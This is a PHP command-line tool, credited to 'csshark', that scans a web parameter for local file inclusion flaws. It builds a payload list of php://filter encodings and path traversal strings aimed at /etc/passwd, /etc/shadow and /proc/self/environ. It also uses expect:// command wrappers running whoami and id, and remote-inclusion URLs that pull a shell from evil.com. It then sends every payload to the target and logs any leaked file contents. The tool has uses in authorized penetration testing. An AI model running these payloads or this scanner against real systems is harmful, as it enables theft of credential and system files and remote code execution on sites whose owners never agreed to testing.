#!/usr/bin/env php
<?php

class LFIWrapperScanner {
    private $colors;
    private $successCount = 0;
    private $testedCount = 0;
    
    public function __construct() {
        $this->initColors();
    }
    
    private function initColors() {
        $this->colors = [
            'red' => "\033[31m",
            'green' => "\033[32m",
            'yellow' => "\033[33m",
            'blue' => "\033[34m",
            'magenta' => "\033[35m",
            'cyan' => "\033[36m",
            'reset' => "\033[0m",
            'bold' => "\033[1m"
        ];
    }
    
    private function color($text, $color) {
        return $this->colors[$color] . $text . $this->colors['reset'];
    }
    
    private function printStatus($message, $type = 'info') {
        $timestamp = date('H:i:s');
        $colors = [
            'info' => 'blue',
            'success' => 'green',
            'warning' => 'yellow',
            'error' => 'red',
            'testing' => 'cyan'
        ];
        
        echo "[{$timestamp}] " . $this->color($message, $colors[$type]) . "\n";
    }
    
    public function generateWrappers($baseUrl, $param, $testFile = '/etc/passwd') {
        $wrappers = [];
        
        // basics
        $basicWrappers = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16/resource=',
            'php://filter/convert.base64-encode/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/resource=',
            'php://filter/read=string.rot13/resource=',
            'php://filter/convert.quoted-printable-encode/resource=',
            'php://filter/read=convert.quoted-printable-encode/resource=',
        ];
        
        // more encodings
        $encodings = [
            'base64',
            'rot13',
            'quoted-printable',
            'zlib.deflate',
            'zlib.inflate',
            'bzip2.compress',
            'bzip2.decompress',
        ];
        
        //generating testfile
        $resources = [
            $testFile,
            '/etc/hosts',
            '/etc/shadow',
            '/proc/self/environ',
            '/proc/version',
            '/etc/group',
            '../../../../../../../../etc/passwd',
            '....//....//....//....//....//etc/passwd',
            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
        ];
        
        // basicWrappers
        foreach ($basicWrappers as $wrapper) {
            foreach ($resources as $resource) {
                $wrappers[] = $wrapper . $resource;
            }
        }
        
        // ComplexWrappers
        $complexWrappers = [
            'php://filter/convert.base64-encode|convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/convert.base64-encode/resource=',
            'php://filter/read=string.rot13|string.rot13|convert.base64-encode/resource=',
        ];
        
        foreach ($complexWrappers as $wrapper) {
            foreach ($resources as $resource) {
                $wrappers[] = $wrapper . $resource;
            }
        }
        
        // Data wrapper  PHP < 8.0
        $dataWrappers = [
            'data://text/plain;base64,',
            'data://text/plain,',
            'data://text/plain;charset=base64,',
        ];
        
        $testContent = base64_encode("test");
        foreach ($dataWrappers as $wrapper) {
            $wrappers[] = $wrapper . $testContent;
        }
        
        // Expect wrapper 
        $wrappers[] = 'expect://whoami';
        $wrappers[] = 'expect://id';
        $wrappers[] = 'expect://ls';
        
        // HTTP wrapper
        $wrappers[] = 'http://evil.com/shell.txt';
        $wrappers[] = 'https://raw.githubusercontent.com/evil/shell/master/shell.php';
        
        // FTP wrapper
        $wrappers[] = 'ftp://user:pass@evil.com/shell.txt';
        
        return $wrappers;
    }
    
    public function testUrl($url, $timeout = 10) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_HEADER => true,
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        
        curl_close($ch);
        
        return [
            'response' => $response,
            'http_code' => $httpCode,
            'total_time' => $totalTime,
            'success' => ($httpCode == 200 && !empty($response))
        ];
    }
    
    public function analyzeResponse($response, $wrapper) {
        $indicators = [
            'root:x:0:0' => 'high', // /etc/passwd
            'root:*:' => 'high', // /etc/shadow (partial)
            'Linux' => 'medium', // /proc/version
            'PATH=' => 'medium', // /proc/self/environ
            'base64' => 'low', // Base64 encoded content
            'dnBibGRz' => 'medium', // encoded content indicators
        ];
        
        $content = $response['response'];
        $confidence = 'low';
        
        foreach ($indicators as $pattern => $conf) {
            if (strpos($content, $pattern) !== false) {
                $confidence = $conf;
                break;
            }
        }
        
        // Sprawdzanie czy odpowiedź zawiera dane base64
        if (preg_match('/^[A-Za-z0-9+\/=]{20,}$/', substr($content, 0, 100))) {
            $confidence = 'medium';
        }
        
        return $confidence;
    }
    
    public function scan($targetUrl, $parameter, $testFile = '/etc/passwd') {
        $this->printStatus("Starting LFI Wrapper Scanner against: " . $targetUrl, 'info');
        $this->printStatus("Testing parameter: " . $parameter, 'info');
        $this->printStatus("Test file: " . $testFile, 'info');
        echo str_repeat("-", 80) . "\n";
        
        $wrappers = $this->generateWrappers($targetUrl, $parameter, $testFile);
        $results = [];
        
        foreach ($wrappers as $i => $wrapper) {
            $this->testedCount++;
            $testUrl = $targetUrl . (strpos($targetUrl, '?') === false ? '?' : '&') . $parameter . '=' . urlencode($wrapper);
            
            $this->printStatus("Testing [" . ($i + 1) . "/" . count($wrappers) . "]: " . $wrapper, 'testing');
            
            $response = $this->testUrl($testUrl);
            $confidence = $this->analyzeResponse($response, $wrapper);
            
            if ($response['success']) {
                $this->successCount++;
                
                $status = $this->color('VULNERABLE', 'green');
                if ($confidence === 'high') {
                    $status = $this->color('HIGHLY VULNERABLE', 'red');
                } elseif ($confidence === 'medium') {
                    $status = $this->color('LIKELY VULNERABLE', 'yellow');
                }
                
                $this->printStatus("✓ " . $status . " - " . $wrapper, 'success');
                $this->printStatus("  HTTP Code: " . $response['http_code'] . " | Time: " . round($response['total_time'], 2) . "s", 'info');
                
                $results[] = [
                    'wrapper' => $wrapper,
                    'url' => $testUrl,
                    'confidence' => $confidence,
                    'response' => substr($response['response'], 0, 500),
                    'http_code' => $response['http_code']
                ];
                
                $this->saveFinding($results[count($results)-1]);
            } else {
                $this->printStatus("✗ Not vulnerable - " . $wrapper, 'error');
            }
            
            usleep(100000); // 100ms
        }
        
        $this->generateReport($results);
    }
    
    private function saveFinding($finding) {
        $filename = 'lfi_findings_' . date('Y-m-d_H-i-s') . '.txt';
        $content = "=== LFI Finding ===\n";
        $content .= "Wrapper: " . $finding['wrapper'] . "\n";
        $content .= "URL: " . $finding['url'] . "\n";
        $content .= "Confidence: " . $finding['confidence'] . "\n";
        $content .= "HTTP Code: " . $finding['http_code'] . "\n";
        $content .= "Response preview:\n" . $finding['response'] . "\n";
        $content .= "==================\n\n";
        
        file_put_contents($filename, $content, FILE_APPEND | LOCK_EX);
    }
    
    private function generateReport($results) {
        echo "\n" . str_repeat("=", 80) . "\n";
        $this->printStatus("SCAN COMPLETED", 'info');
        $this->printStatus("Total tests: " . $this->testedCount, 'info');
        $this->printStatus("Vulnerabilities found: " . $this->successCount, $this->successCount > 0 ? 'success' : 'warning');
        
        if (!empty($results)) {
            $this->printStatus("\nVULNERABLE ENDPOINTS:", 'success');
            foreach ($results as $result) {
                $color = $result['confidence'] === 'high' ? 'red' : ($result['confidence'] === 'medium' ? 'yellow' : 'green');
                echo $this->color("[" . strtoupper($result['confidence']) . "]", $color) . " " . $result['url'] . "\n";
            }
        }
        
        $this->printStatus("\nFindings saved to: lfi_findings_*.txt", 'info');
    }
    
    public function showBanner() {
        $banner = $this->color("
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
                                                                  
        ", 'cyan') . "
        " . $this->color("LFI Wrapper Scanner", 'yellow') . "
        " . $this->color("PHP Wrapper-based LFI Detection Tool", 'blue') . "
        " . $this->color("Author: csshark", 'magenta') . "
        
        ";
        
        echo $banner;
    }
}

if (php_sapi_name() !== 'cli') {
    die("This script must be run from command line\n");
}

$scanner = new LFIWrapperScanner();
$scanner->showBanner();

if ($argc < 3) {
    echo "Usage: php " . $argv[0] . " <target_url> <parameter> [test_file]\n";
    echo "\n"; 
    echo "Example: php " . $argv[0] . " \"http://example.com/vuln.php\" \"file\" \"/etc/passwd\"\n";
    echo "Example: php " . $argv[0] . " \"http://example.com/page.php?param=value\" \"file\" \"/etc/hosts\"\n";
    exit(1);
}

$targetUrl = $argv[1];
$parameter = $argv[2];
$testFile = $argc > 3 ? $argv[3] : '/etc/passwd';

$scanner->scan($targetUrl, $parameter, $testFile);
